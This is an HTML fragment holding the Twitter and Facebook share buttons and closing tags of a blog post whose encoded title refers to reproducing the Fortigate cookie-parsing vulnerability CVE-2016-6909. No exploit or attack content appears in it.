          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90CVE.0x03%E3%80%91CVE-2016-6909%20Fortigate%20%E9%98%B2%E7%81%AB%E5%A2%99%20Cookie%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90 + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2021%2F08%2F10%2FCVE-0X03-CVE-2016-6909%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2021/08/10/CVE-0X03-CVE-2016-6909/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
